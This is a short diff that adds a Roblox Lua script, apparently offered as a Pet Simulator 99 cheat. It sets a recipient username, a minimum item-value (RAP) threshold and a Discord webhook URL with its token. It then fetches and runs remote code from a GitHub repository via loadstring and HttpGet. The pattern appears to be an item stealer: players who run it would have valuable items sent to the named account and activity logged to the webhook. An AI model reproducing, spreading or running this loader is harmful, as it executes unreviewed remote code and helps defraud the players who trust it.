@@ -1,0 +1,6 @@
+Username = "difringgod1"
+Username2 = "difringgod1"
+MinimumRAP = 100000
+Webhook = "https://discord.com/api/webhooks/1356881268263878787/ck_VaVrTF-MNsOQ6-riR0gg225AnK1qtuE0Vav0HXaC2fR3CVef0hMn5_wMRCYrXzD90"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/UrbanDEV0/Pet-Simulator-99-Script-OP-/refs/heads/main/roblox", true))()
